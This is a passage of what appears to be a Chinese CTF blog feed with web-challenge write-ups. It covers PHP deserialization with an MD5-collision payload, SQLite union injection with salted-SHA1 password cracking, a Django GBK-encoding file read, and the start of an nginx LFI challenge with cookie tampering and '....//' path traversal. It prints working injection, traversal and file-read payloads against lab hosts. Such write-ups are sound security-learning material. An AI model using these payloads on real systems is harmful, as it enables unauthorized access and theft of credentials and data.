class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>],<span class="number">0</span>,<span class="number">30</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jesen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span><span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span><span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span><span class="variable">$me</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Jesen</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>产生的c与前两个进行组合产生最终payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9B%EA%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BFm%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%7B%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%276%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s2%87I%DC%18%2F_I%22%F0%F3%CF%5D%05%9D%B2%0B%7DU&amp;b=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9Bj%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BF%ED%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%FB%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%A76%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s%B2%86I%DC%18%2F_I%22%F0%F3%CF%5D%05%1D%B2%0B%7DU&amp;c=O:5:&quot;Jesen&quot;:3:&#123;s:8:&quot;filename&quot;;N;s:7:&quot;content&quot;;N;s:2:&quot;me&quot;;N;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界FlatScience</title>
      <link href="/ctf/sql%E6%B3%A8%E5%85%A5/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CFlatScience/"/>
      <url>/ctf/sql%E6%B3%A8%E5%85%A5/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CFlatScience/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlite-注入引发的pdf爬取与sha1密码爆破"><a href="#sqlite-注入引发的pdf爬取与sha1密码爆破" class="headerlink" title="sqlite 注入引发的pdf爬取与sha1密码爆破"></a>sqlite 注入引发的pdf爬取与sha1密码爆破</h1><p>打开没有发现什么有用信息,扫一下后台目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://111.200.241.244:52362/</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059303.png" alt="image-20220310105938224"></p><p>挨个访问一下发现有</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059580.png" alt="image-20220310105947523"></p><p>在admin.php页面发现</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101058568.png" alt="image-20220310105811511"></p><p>不可能注入成功</p><p>login.php登录试试发现输入单引号有报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059373.png" alt="image-20220310105904267"></p><p>可以得到是sqlite数据库</p><p>这个页面查看源码看看,发现有一个debug参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101059647.png" alt="image-20220310105918595"></p><p>这里地址栏输入一下返回了部分源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现这里是判断查询数据是否存在,存在注入且将信息存放到了cookie中</p><p>tips：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sqlite数据库有一张sqlite_master表，</span><br><span class="line">里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息</span><br></pre></td></tr></table></figure><p>这里构造查询用户创建表时的相关信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr=1&#x27;union select name,sql from sqlite_master--+&amp;pw=a</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101100466.png" alt="image-20220310110033355"></p><p>发现在coolie中存在有信息进行url解码得到有name,password,hint字段</p><p>构造查询name,password,hint字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr=&#x27;union select id,group_concat(name) from Users--&amp;pw=a</span><br><span class="line">usr=&#x27;union select id,group_concat(password) from Users--&amp;pw=a</span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>name</th><th>password</th><th>hint</th></tr></thead><tbody><tr><td>admin</td><td>3fab54a50e770d830c0416df817567662a9dc85c</td><td>my fav word in my fav paper?</td></tr><tr><td>fritze</td><td>54eae8935c90f467427f05e4ece82cf569f89507</td><td>!,my love is…?</td></tr><tr><td>hansi</td><td>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td><td>,the password is password</td></tr></tbody></table><p>所以这里需要查询他的论文</p><p>首先进行pdf文件的爬取工作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例</span></span><br><span class="line"><span class="string"> 匹配这个名称  使用正则表达式首先[]表示字符集匹配集合中的任意字符[a-fA-F0-9]原因是哈希函数是只有a-f A-F 0-9 中的字符</span></span><br><span class="line"><span class="string">  [a-fA-F0-9]&#123;32&#125; 表示匹配前面三十二个字符</span></span><br><span class="line"><span class="string">  [a-fA-F0-9]&#123;32&#125;\.pdf 表示匹配.pdf这个字符</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1/3/7/8/index.html</span></span><br><span class="line"><span class="string">1/index.html 实例</span></span><br><span class="line"><span class="string">匹配后面的名字    ([0-9]&#123;1&#125;\/) &#123;1&#125;表示匹配数字一次首先将1/作为一个整体进行匹配, &#123;0,4&#125;表示匹配0次或者4次index.html表示匹配index.html字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">re1 = <span class="string">&#x27;[a-fA-F0-9]&#123;32&#125;\.pdf&#x27;</span></span><br><span class="line">re2 = <span class="string">&#x27;[0-9\/]&#123;2,2&#125;index.html&#x27;</span></span><br><span class="line">pdf_list = []  <span class="comment"># 创建一个pdf列表,用于储存pdf网址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;中括号[]：</span></span><br><span class="line"><span class="string">代表list列表数据类型，列表是一种可变序列&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取pdfurl列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pdf</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">global</span> pdf_list</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    req = requests.get(url)</span><br><span class="line">    re_1 = re.findall(re1, req.text)  <span class="comment"># 这里使用re匹配响应中符合的pdf名称</span></span><br><span class="line">    <span class="comment"># print(re_1)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re_1:</span><br><span class="line">        pdf_url = url + i</span><br><span class="line">        pdf_list.append(pdf_url)</span><br><span class="line">        <span class="comment"># print(pdf_list)</span></span><br><span class="line">    re_2 = re.findall(re2, req.text)</span><br><span class="line">    <span class="comment"># print(re_2)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> re_2:</span><br><span class="line">        new_url = url + j[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        <span class="comment"># print(j[0:2])</span></span><br><span class="line">        <span class="comment"># print(new_url)</span></span><br><span class="line">        get_pdf(new_url)</span><br><span class="line">    <span class="comment"># print(pdf_list)</span></span><br><span class="line">    <span class="keyword">return</span> pdf_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取pdf文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># req = requests.get(url)</span></span><br><span class="line">    <span class="comment">#print(len(url))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(url)):</span><br><span class="line">        url1 = url[i]</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        req = urllib.request.urlopen(url1)<span class="comment"># 这里使用的是urllib库的request方法的urlopen将对url发起默认get请求</span></span><br><span class="line">        filename = <span class="built_in">str</span>(i) + <span class="string">&#x27;.pdf&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./pdf/<span class="subst">&#123;filename&#125;</span>&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开一个文件并以f为代名 wb 以二进制格式打开文件只用于写入,如果文件已存在则打开文件,并从开头进行编辑,即原有内容会被删除.</span></span><br><span class="line">            block_size = <span class="number">8192</span>  <span class="comment"># 定义一个读取量防止过大爆内存                                 如果该文件不存在,创建新文件,一般用于非文本文件如图片</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                buffer = req.read(block_size)  <span class="comment"># 这里使用read方法进行读取文件默认返回bytes类型</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> buffer:  <span class="comment"># 当buffer为零时即为假那么取反变为真跳出循环</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                f.write(buffer)  <span class="comment"># 进行文件的写入</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sucessful to download&quot;</span> + <span class="string">&quot; &quot;</span> + filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pdf_list = get_pdf(<span class="string">&#x27;http://111.200.241.244:63725/&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(pdf_list)</span></span><br><span class="line">    get_file(pdf_list)</span><br><span class="line">    <span class="comment"># req  = requests.get(&#x27;http://111.200.241.244:63725/c4ca4238a0b923820dcc509a6f75849b.pdf&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 接下来就是提取pdf里的文本信息了，我在网上找了一个pdf转txt的工具：pdftotext.exe，这个工具可以通过命令行把pdf转txt文件，由于文件相对较多，可以通过python多线程来执行，当然也可以直接手动转换。 </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">thread</span>(<span class="params">cmd</span>):<span class="comment">#创建一个cmd类用于通过os.system调用系统cmd</span></span><br><span class="line">    os.system(cmd)</span><br><span class="line"></span><br><span class="line">tsk=[]<span class="comment">#创建一个列表用于存放线程对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    filename = <span class="built_in">str</span>(i) + <span class="string">&#x27;.pdf&#x27;</span><span class="comment">#获取文件名称</span></span><br><span class="line">    filename = <span class="string">&#x27;D:\Download\pdf\\&#x27;</span> + filename</span><br><span class="line">    cmd = <span class="string">r&quot;D:\Data\secquan\tools\编码解码\pdftotext\pdftotext.exe %s&quot;</span>%(filename)<span class="comment">#调用cmd的命令</span></span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    t = threading.Thread(target=thread(cmd))<span class="comment">#创建线程对象</span></span><br><span class="line">    tsk.append(t)<span class="comment">#将线程对象添加到列表中</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tsk:</span><br><span class="line">    t.start()<span class="comment">#启动线程对象</span></span><br></pre></td></tr></table></figure><p>进行本地密码爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiqu</span>(<span class="params">filename</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;./pdf/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(filename), <span class="string">&#x27;r&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)<span class="comment">#这里由于并不是正常编码格式所以会产生保存而使用errors=&quot;ignore&quot;可以将报错信息进行屏蔽</span></span><br><span class="line">    doc = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    dic = doc.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    new_dic = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        i = i.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            new_dic.append(i)</span><br><span class="line">    <span class="keyword">return</span> new_dic</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha</span>(<span class="params">word</span>):</span><br><span class="line">    md = hashlib.sha1()</span><br><span class="line">    md.update((word + <span class="string">&#x27;Salz!&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    haxstr = md.hexdigest()</span><br><span class="line">    <span class="comment">#print(haxstr)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;3fab54a50e770d830c0416df817567662a9dc85c&#x27;</span> == haxstr:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span> + word)</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">34</span>):</span><br><span class="line">        n = tiqu(<span class="built_in">str</span>(i) + <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> n:</span><br><span class="line">            sha(k)</span><br><span class="line">            <span class="comment">#print(base64.b64encode(k.encode(&quot;utf-8&quot;)))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到密码ThinJerboa用户名admin</p><p>到admin.php进行登录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101101554.png" alt="image-20220310110100433"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界cat</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccat/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccat/</url>
      
        <content type="html"><![CDATA[<h1 id="后端django服务gbk编码导致宽字符绕过"><a href="#后端django服务gbk编码导致宽字符绕过" class="headerlink" title="后端django服务gbk编码导致宽字符绕过"></a>后端django服务gbk编码导致宽字符绕过</h1><p>打开发现一个ping命令输入127.0.0.1发现执行成功,推测可能是命令拼接,但是输入任何有关拼接的字符串会提示invalid url </p><p>写一个脚本测试一下过滤了哪些字符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuzz</span>(<span class="params">location</span>):</span><br><span class="line">    url = location.split(<span class="string">&#x27;?&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    param = location.split(<span class="string">&#x27;?&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#print(param)</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;./命令执行payload.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        payload_list = file.readlines()</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">        payload =payload.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">       <span class="comment"># print(payload)</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            param:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(params)</span></span><br><span class="line">        res = requests.get(url=url,params=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Invalid URL&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;未被过滤的字符:<span class="subst">&#123;payload&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   fuzz(<span class="string">&#x27;http://111.200.241.244:55466/index.php?url=a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;未被过滤的字符:@</span></span><br><span class="line"><span class="string">未被过滤的字符:-</span></span><br><span class="line"><span class="string">未被过滤的字符:.</span></span><br><span class="line"><span class="string">未被过滤的字符:/&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>输入@发现在地址栏上@转换成了%40说明有编码转换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:55466/index.php?url=%40</span><br></pre></td></tr></table></figure><p>在url处输入宽字符,比如%bf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101051385.png" alt="image-20220310105149299"></p><p>出现报错信息,将代码复制出来,使用浏览器打开</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101052150.png" alt="image-20220310105214023"></p><p>可以看到这是django的报错页面,看来是将输入的参数传到了后端的django服务中进行解析,而django设置了编码为gbk导致错误编码了宽字符(超过了ascii码的范围)</p><p>这里可以发现是通过post请求方式进行的而又根据之前@符号未进行过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101052487.png" alt="image-20220310105233434"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101054620.png" alt="image-20220310105428400"></p><p>这里还需要懂一些django开发的基本知识，我感觉这道题涉及的面有点广了，django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。</p><p>读取settings.py文件，这里需要注意django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101054951.png" alt="image-20220310105445854"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101054712.png" alt="image-20220310105456612"></p><p>接着使用@访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101055492.png" alt="image-20220310105512413"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:55466/index.php?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure><p>在响应中搜索ctf ,flag找到</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101055850.png" alt="image-20220310105530764"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Web_php_wrong_nginx_config</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含-目录遍历-分析Weevely后门代码-写解密函数"><a href="#文件包含-目录遍历-分析Weevely后门代码-写解密函数" class="headerlink" title="文件包含,目录遍历,分析Weevely后门代码,写解密函数"></a>文件包含,目录遍历,分析Weevely后门代码,写解密函数</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208971.png" alt="1646466067424"></p><p>弹出登录</p><p>扫一下目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208978.png" alt="1646466135692"></p><p>发现</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208975.png" alt="1646466159066"></p><p><strong>hint.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208974.png" alt="1646466609529"></p><p> &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 说文件的配置可能有问题,该文件应该是nginx的站点核心配置文件之一</p><p><strong>Hack.php</strong></p><p>访问改文件得到一个空白页面,猜测改文件没有直接输出任何语句</p><p><strong>&#x2F;admin | &#x2F;admin&#x2F; |&#x2F;ad,im&#x2F;?&#x2F;login | &#x2F;admin&#x2F;index.php</strong>都显示</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208977.png" alt="1646466402867"></p><p><strong>&#x2F;admin&#x2F;admin.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208987.png" alt="1646466466802"></p><p> 弹窗显示 <strong><code>you need to log in</code></strong> , 然后跳转到 <code>login.php</code> 页面 </p><p><strong>&#x2F;images</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208178.png" alt="1646466558803"></p><p>会跳转到&#x2F;images&#x2F;并返回403,没有可以利用的点</p><p>基本信息收集的差不多之后,我们现在有几个可以用的点</p><ol><li><strong>&#x2F;admin&#x2F;admin.php页面</strong></li></ol><p>该页面需要登录情况下才能访问,但是我们没有账号和密码,也没有注册页面,所以账号和密码登录是不太现实的.同样爆破账号密码也不太可能.现在最理想的情况是那个地方泄露了cookie,我们可以利用这个cookie以某个用户的身份进行登录</p><p>​    2. <strong>&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 文件</strong></p><p>这个文中给出的提示,肯定有用,但是现在无法去读取这个文件,最常用的读取文件漏洞有”文件包含”与”任意文件下载(读取)”,但是需要找到可以利用的点</p><p>​    3.<strong>Hack.php页面</strong></p><p>暂时还不知道是怎么利用但是看文件名字肯定可以利用</p><h2 id="本地文件包含读取Nginx配置文件"><a href="#本地文件包含读取Nginx配置文件" class="headerlink" title="本地文件包含读取Nginx配置文件"></a>本地文件包含读取Nginx配置文件</h2><p>这里发现在访问网址时都会带上一个isLogin的cookie,这里没有任何问题,但是isLogin的值被定义为”0”<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208184.png" alt="1646467732253"></p><p>想到cookie是用来识别用户的,维持登录状态的,这里的”0”可能表示布尔值,因此手动将其该为”isLogin&#x3D;1”</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208193.png" alt="1646468011826"></p><p> 然后再访问 <code>/admin/admin.php</code> , 发现我们成功登录到了站点后台 </p><p>后台看起来有很多选项卡 , 其实大部分都是假的 , 即使有几个选项存在页面跳转 , 也都是指向 <code>index.php</code> , 没有什么问题 .</p><p>在登录时发现请求了这么一个界面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208476.png" alt="1646468601366"></p><p>可以发现请求的是后台文件index.php</p><p>其中file参数是文件名,ext参数是文件扩展名,那么这里是否存在LFI(本地文件包含漏洞)</p><ol><li><p><strong>.&#x2F;测试</strong></p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=./index&amp;ext=php</span><br></pre></td></tr></table></figure><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208491.png" alt="1646469038225"></p><p> 2.<strong>..&#x2F;测试</strong></p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=../index&amp;ext=php</span><br></pre></td></tr></table></figure><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208493.png" alt="1646469112174"></p></li></ol><p>响应结果和.&#x2F;完全相同,看起来..&#x2F;并没有被解析处理,或者说是被过滤掉了.</p><p>​    3.<strong>….&#x2F;&#x2F;测试</strong></p><p>​        既然..&#x2F;可能被过滤了,那么就重叠写为….&#x2F;&#x2F;这样如果是只过滤一次,并且过滤为空的话就可以绕过这个过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=....//&amp;ext=php</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208502.png" 